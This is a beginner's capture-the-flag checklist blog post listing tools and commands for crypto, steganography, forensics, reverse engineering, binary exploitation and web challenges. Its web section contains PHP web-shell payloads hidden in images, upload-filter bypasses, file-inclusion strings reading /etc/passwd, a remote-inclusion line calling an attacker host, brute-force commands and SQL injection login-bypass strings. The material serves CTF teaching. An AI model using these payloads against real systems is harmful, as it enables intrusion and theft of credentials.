---
title: "CTF Checklist"
date: "2019-10-27"
layout: single
tags:
- CTF
categories:
- Notes
---


Below are some preparation knowledge and tools beginners need to familiar to play CTF. This list may not complete, but it may good for beginner. So, cheers!

List of Content 👨🏼‍💻
 1. [Operating System](#operating-system)
 2. [Basic](#basic)
 3. [Cryptography](#cryptography)
 4. [Stegano and Forensics](#steganography-and-forensics)
 5. [Digital Forensics](#digital-forensics)
 6. [Reverse Engineering](#reverse-engineering)
 7. [Binary Exploitation](#binary-exploitation)
 8. [Web](#web)
 9. [Misc](#misc)

# Operating System
To master in CTF, you should familiar using Linux OS. Linux been so good in cyber security field. There is a lot of CTF tools pre-installed in Linux. 

My suggestion is to start playing with Kali Linux. Kali Linux is Advanced Penetration Testing Linux distribution used for Penetration Testing, Ethical Hacking and network security assessments.

For me, I used both [**Kali Linux**](https://www.kali.org/) and **Windows** because some tools are easier to play in windows environment and some not. Using VirtualBox will ease your work better than running dual boot. But note here, virtual machine may heavy and high memory for low specs laptop/machine.


# Basic

 1. When CTF organizer give you a binary (download file), always run command `file [filename]` on the binary. 
	- File command will **determine what type of file** are you've downloaded. They will check the magic number or file signature in the binary header. 
	- Learn more about file signature at [here](https://en.wikipedia.org/wiki/List_of_file_signatures). 
	- Some of challenge's creator will confuse you up when they change or remove the extension of a binary. Example, the actual binary is `binary.jpg` but they changed it to `binary.exe`. So, the ctf player will thought that it's a `executable` file instead of `image/jpeg` file.
 2. Run `strings -a [filename]` to **extracts strings** in the given binary. Some clues or artifacts can be found in the `strings` output.
 3. ***Base64*** is the common encoding used in CTF. Learn about it's characteristics and how to decode it. Some online tools that can help you is this [site](https://www.base64decode.org/). But, the better approach is to decode encoded strings using Linux's terminal. It's because some base64 encoded may a binary file. So, if it's a binary file, online tool like in the link can't provide the decoded binary file. It only can decode strings but not binary file. 
	 - Example of Linux command for base64 is like this `echo "[strings of the base64]" | base64 -d`.
 4. Learn about **number encoding**. *Hexadecimal*, *binary*, *decimal* and also *ASCII*. 
	- You can use this [website](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html) to convert your strings to each other. 


# Cryptography
Whatever happen, google is your friend. There are a lot cryptography tools online. Some of good tool are made offline like *OpenSSL*.

**Classic cipher / Simple decoder online tool**

 1. [https://quipqiup.com](https://quipqiup.com) - _quipqiup_ is a fast and automated cryptogram solver
 2. [https://www.base64decode.org/](https://www.base64decode.org/) - base64 decoder
 3. [https://www.urldecoder.org/](https://www.urldecoder.org/) - URL decoder
 4. [https://emn178.github.io/online-tools/base32_decode.html](https://emn178.github.io/online-tools/base32_decode.html) -  Base32 decoder
 5. [https://cryptii.com/](https://cryptii.com/) - All in one tool
 6. [https://www.guballa.de/substitution-solver](https://www.guballa.de/substitution-solver) - Substitution solver
 7. [https://www.guballa.de/vigenere-solver](https://www.guballa.de/vigenere-solver) - Vigenere solver
 8. [https://rot13.com/](https://rot13.com/) - Rot 1 - 25 decryptor
 9. [https://www.dcode.fr](https://www.dcode.fr) -  All in one tool
 10. [http://rumkin.com/tools/cipher/](http://rumkin.com/tools/cipher/) -  All in one tool
 11. [http://www.unit-conversion.info/texttools/morse-code/](http://www.unit-conversion.info/texttools/morse-code/) - Morse code decoder
 12. [https://cryptii.com/pipes/ascii85-encoding](https://cryptii.com/pipes/ascii85-encoding) - ASCII85 decoder

**Modern cryptography**

 13. [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/) - All in one tool
 14. [https://crackstation.net/](https://crackstation.net/) - Crack hash
 15. Cryptool
 16. John the Ripper 
 17. Hashcat
 
 **Cracking compressed file**
 18. John the Ripper - `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
 19. fcrackzip - `fcrackzip -D -u -p rockyou.txt  filename.zip`
 20. Hashcat 

# Steganography And Forensics
**General**
 1. Usually when organizer gave us Image, Music, Video, Zip, EXE, File System, PDF and other files, it a *steganography* or *forensics* challenge. Run `file` command first.
 2. Metadata is important. Checkout the EXIF data of the file by using `exiftool [filename]` command.
 3. Try issuing `binwalk [filename]` on the file. They may hide another file in the file. 
	- To extract, use `binwalk -e`. 
	- To extract one specific signature type, use `binwalk -D 'png image:png' [filename]`. 
	- To extract all files, run `binwalk --dd='.*' [filename]`.
 4. Try file carve using `foremost -v [filename]`  command. Foremost support all files.

**Images**

 1. View the image first
 2. Use `strings` command to that file.
	- Try `grep -i [any strings you want to filter]` from the `strings` command output.
	- Example `grep -i "flag{"` to filtering the flag format only. `-i` option to unable case sensitive.
 3. Google the images, differentiate the `md5hash`. If you found same image but have a different md5 hash, it may probably have been altered.
 4. Analyse the header and the content of the file using any **hex editor**.
 5. Know the **file signature**. Maybe they gave us corrupt header! So fix it!
 6. Maybe **zoom-in** and **zoom-out** method can get the flag.
 7. Use [https://www.tineye.com/](https://www.tineye.com/) to reverse search the image in the internet.
 8. Use `imagemagick` command tool to do image manipulation.
 9. Use **Stegsolve.jar** tools. There are so many CTF I've participated that I used this tool to unhide flag from an image.
 10. File carve using `steghide --extract -sf <filename>`. Try find the password with your own-self. Maybe, the organizer will give hints or the password may in another file.
 11. Check for any corruption on PNG file by using `pngcheck <filename.png>` command.
 12. Detect stegano-hidden data in PNG & BMP s by `issuing zsteg -a <filename.png>`.
 13. Use **SmartDeblur** software to fix blurry on image.
 14. Use `stegcracker <filename> <wordlist>` tools Steganography brute-force password utility to uncover hidden data inside files.
 15. Use `tesseract` to scan text in image and convert it to .txt file.
 16. Another powerfool tool is called `zsteg`.
 17. Some of online stegano decoder :-
		- [https://futureboy.us/stegano/decinput.html](https://futureboy.us/stegano/decinput.html)
		-   [http://stylesuxx.github.io/steganography/](http://stylesuxx.github.io/steganography/)
		-   [https://www.mobilefish.com/services/steganography/steganography.php](https://www.mobilefish.com/services/steganography/steganography.php)
		-   [https://manytools.org/hacker-tools/steganography-encode-text-into-image/](https://manytools.org/hacker-tools/steganography-encode-text-into-image/)
		-   [https://steganosaur.us/dissertation/tools/image](https://steganosaur.us/dissertation/tools/image)
		-   [https://georgeom.net/StegOnline](https://georgeom.net/StegOnline)


**Compressed file**

17. Unzip it.
 18. Use `zipdetails -v` command to display details about the internal structure of a Zip file.
 19. Use `zipinfo` command to know details info about Zip file.
 20. Use `zip -FF input.zip --out output.zip` attempt to repair a corrupted zip file.
 21. Bruteforce the zip password using `fcrackzip -D -u -p rockyou.txt  filename.zip`
 22. To crack 7z run `7z2hashcat32-1.3.exe filename.7z`. Then `john --wordlist=/usr/share/wordlists/rockyou.txt hash`

**Music file**

 23. Use `binwalk` first. They may embedded something in the file.
 24. Use **Audacity**.
 25. Use **Sonic Visualizer**. Look at spectogram and other few Pane.
 26. Use **Deepsound**.
 27. Use **SilentEye**.
 28. Some of online stegano decoder for music:-
	    -   [https://steganosaur.us/dissertation/tools/audio](https://steganosaur.us/dissertation/tools/audio)

**Text**

 1. Use [http://www.spammimic.com/](http://www.spammimic.com/) that can decode hide message in spam text.

# Digital Forensics

 1. Usually organizer will gave us a Digital Image like memory dump like `.raw` or image file like `.e01` and few others more.
 2. Always issuing `file <filename>` command to whatever file you get first! If the result of the file command is only "`data`", you must try harder to find the right tool to carve information that contain in the file.
 3. Checkout the EXIF data of the file by using `exiftool <filename>` command.
 4. Run `strings` for clues.
 5. Try file carve using `foremost <filename>`  command. Foremost support all files. But it takes time to extract all file when you face a big size file.
 6. Common locations for various artifacts :-
	- **Web**: browsing history, cookies, cache files and others.
	- **Windows OS**: registry table, event logs and others.
	- **Linux**: configuration files, log files and others.
	- **Mobile phones**: app data and others.
7. Tools :-
	- **Volatility**. Its a memory extraction utility framework for memory forensic. Use this as your Volatility [command reference](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference).
	- Redline. Another alternative to volatility. But Volatility is the best for me.
	- **Bulk-extractor** software. It can extracts features such as email addresses, credit card numbers, URLs, and other types of information from digital evidence files.
	- **FTK Imager**. FTK Imager is a data preview and imaging tool that allows you to examine files and folders on local hard drives, network drives, CDs/DVDs, and review the content of forensic images or memory dumps.
	- Use **Autopsy** **ProDiscover** or **EnCase** software, function as FTK Imager.
	- Use `e2fsck [mnt image]` to fix corrupt filesystem. ext3 and 4.
8. Recover files using **Recuva**. They may gave you an image  that you can mount to your machine using FTK Imager. So, go to the drive and try recover the files you want.

# Reverse Engineering

1. Note:
  - This challenge is quite hard for beginner. This checklist is not fully cover all things in RE and it will not applicable if you don't have the foundation to play with reverse engineering. 
  - Whenever you get a file, issuing `file`  command first to it to know what really file is it.
  - Use `strings <filename>` command to read the strings in the binary to find some clues. Maybe some `grep -i` command too.
  - You need to strong in C, Assembly Language and computer architecture for this challenge!
  - Usually they gave a binary file. Weather it a...
	    - PE File (.exe or .dll)
	    - ELF File (elf)
	    - APK File (apk)
	    - .NET File (exe)
	    - Java file
	    - Python File (pyc or py)
2. PE File
	  -   Use **DIE**, **PEID**, **PEBear**, or **PEView** software to do static file analysis. Find details of file in there!
	  -   Use **HxD** to check the header file, file signature. Maybe the corrupt file sign one.
	  -   Find it whether it packed or not. Find online unpack.
	  -   Find it whether the binary has anti-debug or not.
	  -   Use **IDA Pro** software to perform static analysis on the binary.
	  -   When do analysis static or dynamic focus on `strcmp`, function `call`, `conditional jump`.
	  -   You can use **Snowman** or **Ghidra** software  to perform decompiler.
	  -   Use debugger like **Immunity Debugger**, **x64Dbg/x32Dbg**, or **WinDbg** to debug the binary.	
3. ELF
    -   Use `ltrace ./<filename>` command to know what library function are being called in the binary.
    -   Use `strace ./<filename>` command to know what system and signal function are being called in the binary.
    -   Use `nm <filename>` command to know what symbol being called in the binary.
    -   Use `readelf -a <filename>`  command. It will displays information about ELF files.
    -   Use Gdb debugger extension. `Peda`, `pwndbg` or `gef` will help you!.
    -   Or you can use edb debugger.
    -   Use **IDA Pro** software to perform static analysis on the binary.
4. APK File
    -   Use `APKTool <filename>` command tools.
    -   Use Android Emulator to run the program.
    -   Use Android Debug Bridge.
    -   Use `dex2jar <filename>` command tools.
    -   Use **jd-gui**. 
    - **JADX** is good alternative to jd-gui.
    -   Rename the file to zip file. Unzip it. Take a look the file in your favorite text editor.
5. .Net File
	  - Use **dnSpy** software. Very powerful. You can compile the program by
		- Edit in the main interface -> compile -> save all. Try run the program back!
6. Java file
	  - Use **JADX**
7. Python file
	  - There are many options, one of it is **uncompyle6**. Just google dor python decompiler.

# Binary Exploitation
1. Note :
	- Usually they gave us a binary and a source code of the binary.
	- Whenever you get a file, issuing file  command first to it to know what really file is it.
	- You need strong in Assembly Language, computer architecture, C programming (Reverse engineering) and Python language to make script for this challenge!
2. Run `checksec` check the properties of executable of binary security.
	-   **Stack Canaries** = a secret value placed on the stack which changes every time the program is started. the stack canary is checked and if it appears to be modified, the program exits immeadiately.
	-   **Nx** = stored input or data cannot be executed as code
	-   **Address Space Layout Randomization (ASLR)** = The randomization of the place in memory where the program, shared libraries, the stack, and the heap are.
	-   **RELRO** = makes binary sections read-only.
3. Tools :
	- Pwntool framework
	- Gdb debugger. Peda, pwndbg or gef.
	- Use `readelf -a <filename>`  command. It will displays information about ELF files.
	- Use `nm <filename>`  command to know what symbol being called in the binary.
	- Python

4.  Some [tips](https://github.com/zjgcjy/CTF-pwn-tips) from expert.
5.  Function that can lead to bof
  - scanf
  - read
  - strcat
  - fread
  - fgets
  - sprintf
  - strcpy
  - gets
  - memcpy
  - memmove
  - strncpy
  - snprintf
  - strncat

# Web
**Enumeration**

-   Check it out web browser
-   What does it display
-   Read entire pages
	-   look for emails, names, user info	-   Enum the interface, what version of CMS, server installation page etc.	-   What does the potential vulnerability in it?
	-   LFI, RFI, Directory traversal, SQL Injection, XML External Entities, OS Command Injection, Upload vulnerability

-   Default web server page which reveals version information?

-   Use Web Application Scanner (Refer note)
	-   Example, nikto
		-   `nikto -h 10.10.10.10 –output filename`

-   Google for exploit
	-   Rapid7
	-   SearchSploit

-   If https
	-   scan for heartbleed
		-   `sslscan 192.168.101.1:443`
		-   `nmap -sV --script=ssl-heartbleed 192.168.3.157`
	-   Read the certificate
		-   Does it include names that might be useful?	-   Correct vhost

-   View the source code
	-   Hidden Values
	-   Developer Remarks
	-   Extraneous Code
	-   Passwords!

-   Use curl
	-   `curl <ip address / dns>`   
-   View robots.txt
-   Brute forcing HTTP(s) directories and files	
-   Tools
	-   dirb
	-   dirbuster
	-   nikto
	-   wfuzz
	-   gobuster for quick directory search

-   Brute force directory recursively
	-   If you found a directory example /admin, bruteforce more deeply
	-   `dirb http://10.10.10.1/admin/`
-   Looking for .git
-   Set extension
	    -   sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar
-   Bruteforce subdomain
    -   [xxx.google.com](http://xxx.google.com/)

-   Creating wordlist from webpage
	-   cewl

-   Redirecting webpage automatically?
	-   noredirect plugin
-   If it's a login page
	-   Try view source code
	-   Use default password
	-   Brute force directory first (sometime you don't need to login to pwn the machine)
	-   using curl
	-   bruteforce credential
		-   Burpsuite		
			-   sniper. clusterbomb  
		-   Wfuzz		
			- `wfuzz -w pass.txt -L 20 -d "username=FUZZ&password=FUZZ" -hw 1224 http://login page path`	
		- Search credential in other service port
			-   tftp
			-   ftp
	-   Enumeration for the credential
	-   Search credential by bruteforce directory
	-   Register first
	-   SQL injection
		-   `SQLMap`
	-   XSS can be used to get the admin cookie
	-   Bruteforce session cookie

-   If it's a CMS
	-   Google their vulnerability	
		- Wordpress, Drupal, Joomla. Vtiger, etc.   
	-   Go to admin page
		   -   Joomla
			    -   /administrator
		    -   Wordpress
			    -   /wp-admin
			    -   /wp-login
	-   Wordpress
	    -   `wpscan -u 192.168.3.145 --enumerate -t --enumerate u --enumerate p`
	    -   Bruteforce login page			
		    -   `wpscan –u ipaddress --username name --wordlist pathtolist`
		-   Random agent
	    -   `wpscan -u http://cybear32c.lab/ --random-agent`
		-   `Zoom.py`
			-   enumerate wordpress users
	- Drupal	
		- `droopsescan https://github.com/droope/droopescan`
		-   `/CHANGELOG.txt` to find version

	-   Adobe Cold Fusion
		-   Metasploit	-   Determine version
		-   /CFIDE/adminapi/base.cfc?wsdl
		-   Version 8 Vulnerabilit
		-   Fckeditor
		-   use exploit/windows/http/coldfusion_fckeditor
		-   LFI
		    -   `http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en`

	-   Elastix
		-   Google the vulnerabitlities
		-   default login are admin:admin at [/vtigercrm/](http://example.com/vtigercrm/)
		-   able to upload shell in profile-photo
		-   Examine configuration files	-   Generic
		-   Examine `httpd.conf`/ windows config files

	-   JBoss
		-   JMX Console `http://IP:8080/jmxconcole/`
		-   War File
	-   Joomla	
		-   configuration.php
		-   diagnostics.php
		-   joomla.inc.php
		-   config.inc.php

	-   Mambo
		-   configuration.php	
		- config.inc.php
	-   Wordpress	
		- setup-config.php	
		- wp-config.php
	-   ZyXel
		-   /WAN.html (contains PPPoE ISP password)
		-   /WLAN_General.html and /WLAN.html (contains WEP key)
		-   /rpDyDNS.html (contains DDNS credentials
		-   /Firewall_DefPolicy.html (Firewall)
		-   /CF_Keyword.html (Content Filter)
		-   /RemMagWWW.html (Remote MGMT)
		-   /rpSysAdmin.html (System)
		-   /LAN_IP.html (LAN)
		-   /NAT_General.html (NAT)
		-   /ViewLog.html (Logs)
		-   /rpFWUpload.html (Tools
		-   /DiagGeneral.html (Diagnostic)
		-   /RemMagSNMP.html (SNMP Passwords)
		-   /LAN_ClientList.html (Current DHCP Leases)
		-   Config Backups
			-   /RestoreCfg.html
			-   /BackupCfg.html

-   Upload page
	-   Upload shell to make reverse shell
	-   Bypass file upload filtering
	-   Rename it
		-   upload it as shell.php.jpg
	-   Blacklisting bypass, change extension
		-   php phtml, .php, .php3, .php4, .php5, and .inc
		-   bypassed by uploading an unpopular php extensions. such as: pht, phpt, phtml, php3, php4, php5, php6
		-   asp asp, .aspx
		-   perl .pl, .pm, .cgi, .lib
		-   jsp .jsp, .jspx, .jsw, .jsv, and .jspf
		-   Coldfusion .cfm, .cfml, .cfc, .dbm
-  Whitelisting bypass
	-   passed by uploading a file with some type of tricks,
	-   Like adding a null byte injection like ( `shell.php%00.gif` ).
	-   Or by using double extensions for the uploaded file like ( shell.jpg.php)
	-   GIF89a;
	-   If they check the content. Basically you just add the text "GIF89a;" before you shell-code.
		``<? system($_GET['cmd']);//or you can insert your complete shellcode ?>``
	-   In image
		-   manipulate data
		-   `exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg`
		-   rename it			
			-  `mv lo.jpg lo.php.jpg`

-   Phpmyadmin
	-   Default password `root:pma`
-   Webmin
    -   Have vulnerabilities, google.
-   Identify WAF using `wafw00f`   
- Spidering a given URL, up to a specified depth, and returns a list of words which can then be used for password crackers
-   WMAP Web Scanner
    -   web application vulnerability scanner

**Exploitation**
-   Heartbleed exploit
    
        use auxiliary/scanner/ssl/openssl_heartbleed
        set RHOSTS 192.168.3.212
        set verbose true
        run

-   XXS
	-   Session hijacking / Cookie theft. Steal cookie to get admin privilege
	-   use xsser tool
-   Local File Inclusion
	-   Bypassing php-execution
		-   `http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index`
	-   Bypassing the added .php and other extra file-endings
		-   `` http://example.com/page=../../../../../../etc/passwd%00 ``
		-   `` http://example.com/page=../../../../../../etc/passwd? ``
	-   folder that always exist
		-   `/etc/hosts /etc/resolv.conf`
	-   add %00jpg to end of files
		-   `/etc/passwd%00jpg`
	-   Refer this for more information
		-   [https://sushant747.gitbooks.io/total-oscp-guide/local_file_inclusion.html](https://sushant747.gitbooks.io/total-oscp-guide/local_file_inclusion.html)
		-   [https://highon.coffee/blog/lfi-cheat-sheet/](https://highon.coffee/blog/lfi-cheat-sheet/)

-   Remote file inclusion
    -   http://exampe.com/index.php?page=http://attackerserver.com/evil.txt

-   SQL Injection
	-   Enum using nmap
		-   `nmap -sV --script=http-sql-injection <target>`
	-   Using jsql
	-   Using sqlmap with login-page
	-   Capture the request using burp suite, and save the request in a file.
	-   `sqlmap -r request.txt`
	-   Crawl a page to find sql-injections
		-   `sqlmap -u http://example.com --crawl=1`
	-   [http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

	-   Login bypass
		-   `‘or 1=1- -`
		-   `‘ or ‘1’=1`
		-   `‘ or ‘1’=1 - -`
		-   `‘–`
		-   `' or '1'='1`
		-   `-'`
		-   `' '`
		-   `'&'`
		-   `'^'`
		-   `'*'`
		-   `' or ''-'`
		-   `' or '' '`
		-   `' or ''&'`
		-   `' or ''^'``
		-   `' or ''*'
		-   `"-"`
		-   `" "`
		-   `"&"`
		-   `"^"`
		-   `"*"`
		-   `" or ""-"`
		-   `" or "" "`
		-   `" or ""&"`
		-   `" or ""^"`
		-   `" or ""*"`
		-   `or true--`
		-   `" or true--`
		-   `' or true--`
		-   `") or true--`
		-   `') or true--`
		-   `' or 'x'='x`
		-   `') or ('x')=('x`
		-   `')) or (('x'))=(('x`
		-   `" or "x"="x`
		-   `") or ("x")=("x`
		-   `")) or (("x"))=(("x`
		-   known Username
			-   `admin’ - -`
			-   `admin’) - -`

	-   Using error-bases DB enumeration
		-   Add the tick `'`
		-   Enumerate columns

	-   Using order by
		-   [https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html](https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html)

-   XML External Entity (XXE)
-   URL vulnerability
-   OS command Injection
-   Directory traversal
-   Dotdotpwn tool

# Misc
- Google is your best friend 😊

# Last few tips
- Don't read this checklist without practice, you will blank in the competition (of course you will forget what you read) because the time-clock is running and you don't have time to read this again during competition. The best practice is read and applied at the same time.
- Read a lot of write-ups and of course **practice the challenge!!!!!!!!**
- Do many challenges as much as you can. Online practice site can refer [here](https://fareedfauzi.github.io/ctfonline/).
- CTF is great for industry. Trust me. It worth for your future for every seconds you spend to learn.
- Split your task during competition. Don't try to be "hero" or be "I'm the genius one in my team". You should learn to know your limit. Not everyone can master every categories in CTF. Example, there is a RE guy, Pentest guy, and Scripter guy in one team.
- Do not study hard a day before CTF, sometimes when your brain is loaded up too much.. you will blank during the game. Just relax and calm.
- Final, don't show off your skills. There is a lot of pro out there. *"Showing off is the fool's idea of glory."* - Bruce Lee
